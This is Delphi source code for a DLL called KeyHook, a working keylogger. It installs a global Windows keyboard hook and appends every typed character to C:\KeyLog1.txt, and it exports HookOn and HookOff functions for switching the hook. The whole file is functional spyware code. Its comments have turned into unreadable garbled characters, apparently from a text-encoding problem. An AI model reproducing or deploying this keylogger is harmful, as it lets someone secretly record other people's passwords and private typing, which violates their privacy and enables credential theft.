library KeyHook;

uses Windows;

var KeyboardHook: HHOOK;

 // ���̹��ӻص�����
function KeyboardProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  Kbs: TKeyboardState;
  HFile: THandle;
  WChar: array[0..1] of Char;
  WSize: DWORD;
begin
 // ��Ϣ�ᱻ�Ƴ�����, ����, ���ε�������Ϊ���̰���
  if (nCode = HC_ACTION) and (lParam and $80000000 = 0) then
  begin
   // ȡ����״̬
    GetKeyboardState(Kbs);

   // ת�����ַ�
    if ToAscii(wParam, (lParam shr 16) and $FF, Kbs, WChar, 0) = 1 then
    begin
     // ���ļ�
      HFile := CreateFile('C:\KeyLog1.txt', GENERIC_WRITE,
        FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

     // ����ַ�
      SetFilePointer(HFile, 0, nil, FILE_END);
      WriteFile(HFile, WChar[0], 1, WSize, nil);

     // �س���#10
      if (WChar[0] = #13) then
      begin
        WChar[0] := #10;
        WriteFile(HFile, WChar[0] , 1, WSize, nil);
      end;

     // �رձ���
      CloseHandle(HFile);
    end;
  end;

 // ������һ�����Ӵ���, ���ҷ������ķ���ֵ
  Result := CallNextHookEx(KeyboardHook, nCode, wParam, lParam);
end;

 // �Ҽ��̹���
procedure HookOn();
begin
  KeyboardHook := SetWindowsHookEx(WH_KEYBOARD, @KeyboardProc, HInstance, 0);
end;

 // �Ѽ��̹���
procedure HookOff();
begin
  UnHookWindowsHookEx(KeyboardHook);
end;

exports
  HookOn, HookOff;

begin
end.

